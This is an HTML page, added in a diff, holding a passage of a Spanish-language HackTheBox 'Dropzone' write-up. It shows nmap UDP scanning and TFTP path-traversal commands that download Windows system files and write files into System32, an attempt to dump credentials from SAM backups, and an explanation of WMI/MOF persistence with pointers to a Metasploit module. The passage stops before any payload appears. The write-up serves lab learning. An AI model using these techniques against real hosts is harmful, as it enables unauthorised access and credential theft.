@@ -1,0 +1,1855 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Dropzone</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Dropzone | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Dropzone" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel difícil, bastante bastante entretenida, jugaremos con un servicio TFTP para escribir archivos arbitrariamente en el sistema (sin restricción), usaremos esa habilidad para jugar con objetos .mof y el servicio WMI, consiguiendo así pasar de una simple subida de archivos a una “simple” ejecución remota de comandos en el sistema (: Finalmente debemos encontrar contenido oculto en archivos, esto mediante el feature ADS en Windows." />
+<meta property="og:description" content="Máquina Windows nivel difícil, bastante bastante entretenida, jugaremos con un servicio TFTP para escribir archivos arbitrariamente en el sistema (sin restricción), usaremos esa habilidad para jugar con objetos .mof y el servicio WMI, consiguiendo así pasar de una simple subida de archivos a una “simple” ejecución remota de comandos en el sistema (: Finalmente debemos encontrar contenido oculto en archivos, esto mediante el feature ADS en Windows." />
+<link rel="canonical" href="http://localhost:4000/htb/dropzone" />
+<meta property="og:url" content="http://localhost:4000/htb/dropzone" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-01T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139banner.png" />
+<meta property="twitter:title" content="HackTheBox - Dropzone" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-06-01T00:00:00-07:00","datePublished":"2021-06-01T00:00:00-07:00","description":"Máquina Windows nivel difícil, bastante bastante entretenida, jugaremos con un servicio TFTP para escribir archivos arbitrariamente en el sistema (sin restricción), usaremos esa habilidad para jugar con objetos .mof y el servicio WMI, consiguiendo así pasar de una simple subida de archivos a una “simple” ejecución remota de comandos en el sistema (: Finalmente debemos encontrar contenido oculto en archivos, esto mediante el feature ADS en Windows.","headline":"HackTheBox - Dropzone","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/dropzone"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/dropzone"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Dropzone</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-06-01">01 Jun 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139banner.png" alt="HackTheBox - Dropzone">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina <strong>Windows</strong> nivel difícil, bastante bastante entretenida, jugaremos con un servicio <strong>TFTP</strong> para escribir archivos arbitrariamente en el sistema (sin restricción), usaremos esa habilidad para jugar con objetos <strong>.mof</strong> y el servicio <strong>WMI</strong>, consiguiendo así pasar de una simple subida de archivos a una “simple” ejecución remota de comandos en el sistema (: Finalmente debemos encontrar contenido oculto en archivos, esto mediante el feature <strong>ADS</strong> en Windows.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139dropzoneHTB.png" alt="139dropzoneHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/302">eks</a> &amp; <a href="https://www.hackthebox.eu/profile/39054">rjesh</a>.</p>
+
+<p>A quemaaaaaaaaaaaaaaaaaaaaaaaaaaarlo todoooooooooooooooooooooOO!!</p>
+
+<p>Listoooooones, nos encontraremos con un único puerto <strong>UDP</strong>, es un servicio <strong>TFTP</strong> llamado <strong>SolarWinds Free tftpd</strong>. Jugando con él conseguiremos tanto descargar como subir archivos al servidor, pero lo curioso es que el “servidor” es el propio sistema, por lo que estaremos moviéndonos entre archivos del propio sistema (:</p>
+
+<p>Nos daremos cuenta de que podemos (de nuevo :P) tanto descargar como subir archivos en directorios donde no deberíamos poder, por lo que entendemos que o somos administradores directamente o estamos con un usuario que tiene permisos administrativos ;)</p>
+
+<p>Teniendo en cuenta esto, encontraremos la forma de ejecutar comandos remotamente aprovechándonos de la subida de archivos. Jugando con el servicio <strong>WMI</strong> y un objeto <code>.mof</code> le indicaremos que al ser compilado nos ejecute alguna instrucción (llegaremos a obtener una <strong>Reverse Shell</strong> con ayuda de <code>nc.exe</code>, todo esto definido dentro del propio archivo <code>.mof</code>). <strong>(Ahondaremos en esto en su momento)</strong>.</p>
+
+<p>Estando dentro de la máquina tendremos que jugar con el feature de <strong>NTFS</strong> llamado <strong>ADS o Alternative Data Stream</strong> el cual sirve como método para ocultar archivos dentro de otros archivos o directorios. Con esta premisa jugaremos con dos objetos interesantes, así encontraremos ocultas las flags tanto de <code>user.txt</code> como de <code>root.txt</code> en uno de ellos (:</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Vulnerabilidades comunes o que tienen bastaaaaante información pero más o menos realista :(</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Iremos volando entre montañas, surfeando en sus ojos llenos de lágrimas… ⛲</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral-ads">Movimiento lateral ADS -&gt; flags</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Empezaremos como siempre :P Enumeremos que puertos estás abiertos en la máquina:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.90
+...
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+...
+</code></pre>
+
+<p>Entonces agregamos el parámetro <code>-Pn</code>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v -Pn 10.10.10.90 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evita realizar Host Discovery, tal como el ping (P) y el DNS (n)</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pero el escaneo va muy lento, así que agreguémosle el parámetro <code>--min-rate</code>, así aprovechamos para indicarle cuál es el mínimo de paquetes que queremos que envíe en cada petición, le diremos que sean <strong>3000</strong>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v --min-rate=3000 -Pn 10.10.10.90 -oG initScan
+</code></pre>
+
+<p>Pero como resultado vemos que no tenemos ningún puerto TCP abierto… Despues de jugar con algunos <a href="https://www.cbtnuggets.com/blog/certifications/security/7-absolutely-essential-nmap-commands-for-pen-testing">parámetros de <strong>nmap</strong></a>, intentamos hacer un escaneo, pero de servicios <a href="https://es.wikipedia.org/wiki/Protocolo_de_datagramas_de_usuario">UDP</a> (con <code>-sU</code>), con este encontramos algo:</p>
+
+<pre><code class="language-bash">❱ nmap -sU -p- --open -v --min-rate=3000 -Pn 10.10.10.90 -oG initScan
+</code></pre>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Wed May 19 25:25:25 2021 as: nmap -sU -p- --open -v --min-rate=3000 -Pn -oG initScan 10.10.10.90
+# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.90 ()    Status: Up
+Host: 10.10.10.90 ()    Ports: 69/open/udp//tftp/// Ignored State: open|filtered (65534)
+# Nmap done at Wed May 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 51.63 seconds
+</code></pre>
+
+<p>Y obtenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>69/udp</td>
+      <td style="text-align: left">Al parecer el servicio <strong><a href="https://es.wikipedia.org/wiki/TFTP">TFTP</a></strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora hagamos un escaneo de scripts y versiones, esto nos dará mucha más información (a veces :P) del servicio en cuestión…</p>
+
+<p>Si intentamos como normalmente lo hacemos, o sea contra un puerto TCP, nos indica:</p>
+
+<pre><code class="language-bash">❱ nmap -p69 -sC -sV -Pn 10.10.10.90 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+...
+PORT   STATE    SERVICE VERSION
+69/tcp filtered tftp
+...
+</code></pre>
+
+<p>Y ahora indicándole que es un escaneo de puertos <strong>UDP</strong>:</p>
+
+<pre><code class="language-bash">❱ nmap -sU -p69 -sC -sV -Pn 10.10.10.90 -oN portScan
+</code></pre>
+
+<pre><code class="language-bash">❱ cat portScan
+...
+PORT   STATE SERVICE VERSION
+69/udp open  tftp    SolarWinds Free tftpd
+...
+</code></pre>
+
+<p>Bien, encontramos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">69/udp</td>
+      <td style="text-align: left">TFTP</td>
+      <td style="text-align: left">SolarWinds Free tftpd</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Bueno, pues veamos de que se trata y como explotarlo (:</p>
+
+<p>…</p>
+
+<h3 id="puerto-69">Puerto 69/UDP <a href="#puerto-69">⌖</a></h3>
+
+<blockquote>
+  <p><strong>TFTP</strong> es un servidor para tranferir archivos de máquina remota a host y de host a máquina remota. No necesitamos estar autenticados y esta sirviendo sobre el protocolo <strong>UDP</strong>.</p>
+</blockquote>
+
+<p>En nuestro caso tenemos un servicio en específico: <a href="https://www.solarwinds.com/es/free-tools/free-tftp-server">SolarWinds Free</a>, que nos ayuda con el tema de la transferencia de archivos de forma “segura”…</p>
+
+<p>Investigando sobre ese software, encontramos cositas interesantes relacionadas con exploits y vulnerabilidades reportadas:</p>
+
+<ul>
+  <li><a href="https://www.cvedetails.com/cve/CVE-2006-1951/">CVE-2006-1951 - Directory Path Traversal</a>.</li>
+  <li><a href="https://www.exploit-database.net/?id=73679">PoC Path Traversal <strong>TFTP</strong></a>.</li>
+  <li><a href="https://www.exploit-db.com/exploits/18718"><strong>Este no es exclusivo del CVE, pero muestra mucho mejor el Path Traversal en otro software TFTP</strong></a>.</li>
+</ul>
+
+<p>Entonces, vemos que existe una vulnerabilidad de <a href="https://owasp.org/www-community/attacks/Path_Traversal">Path Traversal</a>, la cual nos permite interactuar con archivos del sistema o servidor a los cuales no deberíamos tener acceso.</p>
+
+<p>Empleando la herramienta <a href="https://www.ibm.com/docs/de/aix/7.2?topic=transfers-file-using-tftp-utftp-commands">tftp</a> podemos jugar con el servidor para transferir archivos, también usaremos <strong>rlwrap</strong> para poder movernos entre comandos y tener histórico de lo que hemos hecho.</p>
+
+<p>(Antes, agreguemos el dominio <strong>dropzone.htb</strong> (no lo hemos visto en ningún lado, pero es el que tiene más sentido) al archivo <a href="https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html">/etc/hosts</a> contra la IP de la máquina, por si algo).</p>
+
+<pre><code class="language-bash">❱ rlwrap tftp dropzone.htb 69
+tftp&gt; status
+Connected to dropzone.htb.
+Mode: netascii Verbose: off Tracing: off
+Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
+tftp&gt; 
+</code></pre>
+
+<p>Validamos que estamos conectados :) Ahora intentemos <a href="https://www.ibm.com/docs/de/aix/7.2?topic=commands-copying-file-remote-host">subir</a> un archivo:</p>
+
+<pre><code class="language-bash">❱ echo "si si como no, claro que si" &gt; hola.txt
+</code></pre>
+
+<pre><code class="language-bash">tftp&gt; put hola.txt
+Sent 29 bytes in 0.2 seconds
+tftp&gt;
+</code></pre>
+
+<p>Podemos subir archivos… Intentemos <a href="https://www.ibm.com/docs/de/aix/7.2?topic=commands-copying-file-from-remote-host">descargarlo con otro nombre</a>:</p>
+
+<pre><code class="language-bash">tftp&gt; get hola.txt chao.txt
+Received 29 bytes in 0.1 seconds
+tftp&gt;
+</code></pre>
+
+<pre><code class="language-bash">❱ cat chao.txt 
+si si como no, claro que si
+</code></pre>
+
+<p>Bien, así que también podemos descargar archivos… Dando saltos encontramos la ruta en la que estamos:</p>
+
+<pre><code class="language-bash">tftp&gt; get siclaro.txt
+Error code 1: Could not find file 'C:\siclaro.txt'.
+tftp&gt; 
+</code></pre>
+
+<p>Estamos en la raíz del sistema al parecer, pero no sabemos que archivos hallan ni como movernos para llegar a probar el <strong>Path Traversal</strong>, así, que, a, JUGAR!</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Explorando algunos exploits (poc) y moviéndonos con ellos (aún sin saber que archivos puedan existir, pero probando algunos que están por default en los sistemas <strong>Windows</strong> o que son <a href="http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf">importantes en él</a>), logramos finalmente encontrar la forma de movernos entre archivos y de descargarlos:</p>
+
+<pre><code class="language-bash">tftp&gt; get /Windows/System32/Ntdll.dll
+Received 706048 bytes in 146.0 seconds
+tftp&gt;
+</code></pre>
+
+<pre><code class="language-bash">❱ file Ntdll.dll 
+Ntdll.dll: MS-DOS executable
+</code></pre>
+
+<p>En nuestro caso descargamos el archivo <strong>Ntdll.dll</strong> (que podría haber sido cualquier otro, esto es más de prueba), que da soporte interno a distintas funciones del sistema. Así que:</p>
+
+<ol>
+  <li>Sabemos el formato para movernos entre archivos del sistema: <code>get /&lt;path&gt;</code> o <code>put &lt;file&gt; /&lt;path&gt;</code>.</li>
+  <li>Aparentemente podemos interactuar con archivos del sistema, o sea que tenemos privilegios para hacerlo, confirmémoslo jugando con <a href="https://hakluke.medium.com/sensitive-files-to-grab-in-windows-4b8f0a655f40">archivos sensibles en <strong>Windows</strong></a>.</li>
+</ol>
+
+<p>No podemos interactuar directamente con los objetos <strong>SAM</strong> y <strong>SYSTEM</strong>, ya que el sistema los está usando actualmente. Intentando descargar de la carpeta <code>C:\Windows\repair</code>, el backup del registro <strong>SAM</strong> como del registro <strong>SYSTEM</strong>, y jugando con la herramienta <a href="https://superuser.com/questions/364290/how-to-dump-the-windows-sam-file-while-the-system-is-running/1088644">samdump2</a> para dumpear las credenciales guardadas, no logramos nada :(</p>
+
+<p><strong>Peeeeeeeero</strong>, podemos corroborar que tenemos algún tipo de privilegio al subir archivos a sitios “peligrosos” y con habitual restricción:</p>
+
+<pre><code class="language-bash">tftp&gt; put hola.txt /Windows/repair/holiwis.txt
+Sent 29 bytes in 0.2 seconds
+tftp&gt; put hola.txt /Windows/System32/holiwis.txt
+Sent 29 bytes in 0.2 seconds
+tftp&gt; put hola.txt /Windows/System32/config/holiwis.txt
+Sent 29 bytes in 0.2 seconds
+tftp&gt; 
+</code></pre>
+
+<p>Perfecto, podemos subir archivos en sitios donde no deberíamos si no tuviéramos privilegios.</p>
+
+<p>Bien, perooooo, como podemos aprovechar subir archivos para ejecutar comandos… Llega la parte de búsqueda y captura 😎</p>
+
+<p>…</p>
+
+<p>Siguiendo la lista de <a href="http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf">archivos interesantes en los sistemas <strong>Windows</strong></a>, vemos uno llamado <strong>Boot.ini</strong>, el cual contiene información de la versión del sistema en el que estamos, echémosle un ojo:</p>
+
+<pre><code class="language-bash">tftp&gt; get /Boot.ini
+Received 211 bytes in 0.1 seconds
+tftp&gt; 
+</code></pre>
+
+<pre><code class="language-powershell">❱ cat Boot.ini 
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+</code></pre>
+
+<p>Vale, <strong>Microsoft Windows XP Professional</strong>, esto quizás nos sirva para acotar nuestra búsqueda (:</p>
+
+<p>…</p>
+
+<p>Despues de buscar y buscar, encontramos una vulnerabilidad locochona (es de otro servidor <strong>FTP</strong> llamado <strong>Open-FTPD</strong>), lo interesante está en su descripción:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_openftpdESC.png" alt="139google_openftpdESC" /></p>
+
+<blockquote>
+  <p><a href="https://www.hackingarticles.in/exploit-windows-pc-using-open-ftpd-1-2-arbitrary-file-upload/">Arbitrary file upload - OpenFTPD 1.2</a>.</p>
+</blockquote>
+
+<p>Indica que la vulnerabilidad permite escribir cualquier tipo de archivo en cualquier directorio (esto ya lo sabíamos), peeeero que es posible conseguir ejecución remota de comandos mediante un archivo <code>.mof</code>, él habilitara el servicio <strong>WMI (Management Instrumentation service)</strong> para que ejecute un archivo <code>.exe</code> (que sería nuestro payload) 😲</p>
+
+<p>Pufff pues es lo que necesitamos, pero claro, está relacionado con otro software :( y está creado para ser ejecutado con <strong>metasploit</strong>…</p>
+
+<p>Antes de seguir exploremos que es un archivo <code>.mof</code> y su interacción con el servicio <strong>WMI</strong>, así nos queda más claro lo que queremos hacer y como es que funciona.</p>
+
+<p>Caí en un <strong>Rabbit Hole</strong>, pero encontré un lindo recurso que no quería perder:</p>
+
+<ul>
+  <li><a href="https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html">Intro to file operation abuse on <strong>Windows</strong></a>.</li>
+</ul>
+
+<p>…</p>
+
+<h4 id="buceando-entre-archivos-mof-y-el-servicio-wmi">Buceando entre archivos .mof y el servicio WMI</h4>
+
+<p>…</p>
+
+<h5 id="wmi-windows-management-instrumentation">WMI (Windows Management Instrumentation)</h5>
+
+<p>Hablemos primero del servicio <strong>WMI</strong>:</p>
+
+<blockquote>
+  <p><strong>Windows Management Instrumentation (WMI)</strong> es una implemtación del conjutno de tecnologias <strong>WBEM (Web-Based Enterprise Management)</strong> que habilita a los adminsitradores del sistema ejecutar tareas tanto local como remotamente.</p>
+</blockquote>
+
+<p>Básicamente es eso, pero si pensamos como atacantes puede ser muy peligroso, ¿no?</p>
+
+<p>Acá una descripción gráfica de la arquitectura con la que cuenta <strong>WMI</strong>: (Vemos algunos servicios con los que hemos interactuado en otras máquinas, como por ejemplo <strong>WinRM</strong> (evil-winrm))</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_wmi_architecture.png" alt="139google_wmi_architecture" /></p>
+
+<blockquote>
+  <p>Tomada de: <a href="https://www.hackplayers.com/2021/03/entendiendo-los-ataques-con-wmi.html">hackplayers.com/ataques_wmi</a>.</p>
+</blockquote>
+
+<p>El poder que toma <strong>WMI</strong> como atacantes llega cuando pensamos en <strong>persistencia</strong>, tener acceso ilimitado a un sistema por ejemplo, o ejecutar X tarea en cualquier momento sin preocuparnos de nada. <strong>Acá</strong> entran en juego los archivos <code>.mof</code> y una característica necesaria en cada uno de ellos:</p>
+
+<ul>
+  <li>Requieren el uso de <strong>3</strong> clases, cada clase tiene su uso:
+    <ol>
+      <li><strong>__EventFilter</strong>: Almacenar el payload que queremos ejecutar. (Usa <strong>WMI Query Languaje (WQL)</strong> para detectar el evento</li>
+      <li><strong>__EventConsumer</strong>: El evento que hará ejecutar lo que tenemos en la clase <strong>1</strong>.</li>
+      <li><strong>__FilterToConsumerBinding</strong>: Relacionar las <strong>2</strong> clases anteriores (tanto el evento como la acción).</li>
+    </ol>
+  </li>
+</ul>
+
+<p>Algunos recursos para leer sobre <strong>WMI</strong> y las clases del archivo <code>.mof</code>:</p>
+
+<ul>
+  <li><a href="https://www.hackplayers.com/2021/03/entendiendo-los-ataques-con-wmi.html">Entendiendo los ataques con <strong>WMI</strong></a>.</li>
+  <li><a href="http://www.fuzzysecurity.com/tutorials/19.html"><strong>WMI</strong> Permanent Event Subscription - <strong>MOF</strong> files</a>. Este recurso tiene muchas referencias guapas para profundizar como nunca en estos temas, a ojear ;)</li>
+</ul>
+
+<p>Peero, los qué más destaque (y usé) fueron estos dos:</p>
+
+<ul>
+  <li><a href="http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">Playing with <strong>MOF</strong> files on <strong>Windows</strong></a>.</li>
+  <li><a href="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/">Persistence <strong>WMI</strong> event subscription</a>.</li>
+</ul>
+
+<p>Bien, como dije antes, estas tres clases están incluidas en un archivo <code>.mof</code> (Managed object format), pero, ¿qué es esto y como interactúa con <strong>WMI</strong>?</p>
+
+<h5 id="mof-managed-object-format">MOF (Managed object format)</h5>
+
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-">MOF</a> es el lenguaje que se usa para describir las clases de los <strong>m</strong>odelos de <strong>i</strong>nformación <strong>c</strong>omún, abreviados como <strong>CIM</strong>:</p>
+
+<blockquote>
+  <p>Estándar abierto que define cómo los elementos administrados en un entorno de TI se representan como un conjunto común de objetos y relaciones entre ellos. <a href="https://en.wikipedia.org/wiki/Common_Information_Model_(computing)">CIM</a>.</p>
+</blockquote>
+
+<p>Entonces, la interacción se logra gracias a las clases del archivo <code>.mof</code> que son interpretadas por el servicio <strong>WMI</strong> cuando el objeto <code>.mof</code> es compilado…</p>
+
+<p>Acá encontramos que para la compilación del objeto a primera vista era necesario hacerlo manualmente, esto mediante el programa <code>Mofcomp.exe</code> alojado en el repositorio <strong>WMI</strong>, peeeeeeeeeeeeeeeeeeeeero apoyándonos en los recursos, vemos esto:</p>
+
+<blockquote>
+  <p>a MOF file that is put in the <code>%SystemRoot%\System32\wbem\mof\</code> directory is automatically <strong>compiled</strong> and <strong>registered</strong> into the <strong>WMI</strong> repository.</p>
+</blockquote>
+
+<p>Opa, así que solo necesitaríamos colocar nuestro objeto en esa ruta y no deberíamos preocuparnos por su compilación (:</p>
+
+<p>Un ejemplo que nos da <a href="http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">poppopret</a> es el muy conocido <a href="https://es.wikipedia.org/wiki/Stuxnet">Stuxnet</a> que fue capaz de controlar y juguetear con sistemas industriales (SCADA) reprogramando tareas y creando otras, algunas de ellas usando el mismo tipo de ataque, ellos subieron:</p>
+
+<blockquote>
+  <ul>
+    <li><code>%SystemRoot%\System32\winsta.exe</code>: Stuxnet’s main module</li>
+    <li><code>%SystemRoot%\System32\wbem\mof\sysnullevnt.mof</code>: MOF file that will automatically compile itself and that contains the code needed to execute the winsta.exe file when some events occur.</li>
+  </ul>
+</blockquote>
+
+<p>Linda vuln…</p>
+
+<p><strong>En resumen</strong>, el objeto <code>.mof</code> tiene clases, entre ellas generar “pasos” e “instrucciones” de las cuales nos podemos aprovechar, con las instrucciones dentro, solo necesitaríamos colocar ese objeto en la ruta anterior para que se autocompile y ejecute lo que queramos que ejecute :P</p>
+
+<p>…</p>
+
+<p>Pues listos, hemos ahondado en estos dos temas y tenemos claro la función y el porqué, sigamos jugando con la vulnerabilidad del <strong>OpenFTPD 2.1</strong>:</p>
+
+<p>Investigando el exploit que usa (<code>exploit/windows/ftp/open_ftpd_wbem</code>) según el <a href="https://www.hackingarticles.in/exploit-windows-pc-using-open-ftpd-1-2-arbitrary-file-upload/">PoC</a>, encontramos el código fuente:</p>
+
+<ul>
+  <li><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/ftp/open_ftpd_wbem.rb">open_ftpd_wbem.rb</a></li>
+</ul>
+
+<p>Leyendo el script, vemos el llamado a una función, <code>generate_mof()</code>: (que claramente es llamativa para nosotros, <strong>porque si es genérica</strong>, nos puede servir como base para el objeto <code>.mof</code>)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_openftpdRB_funcMOF.png" alt="139google_openftpdRB_funcMOF" /></p>
+
+<p>Donde toma como argumentos, el nombre que le queremos poner al archivo <code>.mof</code> y el nombre del archivo <code>.exe</code>… Dando clic sobre la función, nos muestra:</p>
+
+<blockquote>
+  <p>Defined in <code>lib/msf/core/exploit/wbem_exec.rb</code>.</p>
+</blockquote>
+
+<p>Y si ahora damos clic sobre esa referencia llegamos a la fuente del archivo <a href="https://github.com/rapid7/metasploit-framework/blob/882c2722af5e0cec988baeb5945c9066fec1e7ca/lib/msf/core/exploit/wbem_exec.rb#L17">wbem_exec.rb</a>:</p>
+
